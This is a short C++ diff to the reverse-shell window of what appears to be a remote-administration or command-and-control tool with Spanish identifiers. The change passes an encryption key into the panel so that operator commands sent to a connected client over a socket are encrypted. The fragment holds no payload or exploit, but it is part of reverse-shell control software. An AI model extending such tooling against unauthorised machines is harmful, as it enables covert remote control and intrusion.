@@ -13,11 +13,12 @@ wxEND_EVENT_TABLE()
 
 
 //Reverse Shell
-panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID) :
+panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key) :
     wxFrame(pParent, EnumIDS::ID_Panel_Reverse_Shell, "[" + _strID + "] Shell Inversa", wxDefaultPosition, wxSize(700, 400)) {
 
     this->SetName(_strID + "-shell");
     this->sckCliente = sck;
+    this->enc_key = c_key;
     this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Shell Inversa");
 
     this->txtConsole = DBG_NEW wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_RICH);
@@ -95,7 +96,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         str1.append(1, '\r');
         str1.append(1, '\n');
 
-        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command);
+        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command, this->enc_key);
 
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
         event.Skip();
@@ -144,6 +145,5 @@ void panelReverseShell::OnButton(wxCommandEvent& event) {
             break;
     }
 
-    p_Servidor->cChunkSend(this->sckCliente, strCommand.c_str(), strCommand.size(), 0, false, iComando);
-
+    p_Servidor->cChunkSend(this->sckCliente, strCommand.c_str(), strCommand.size(), 0, false, iComando, this->enc_key);
 }
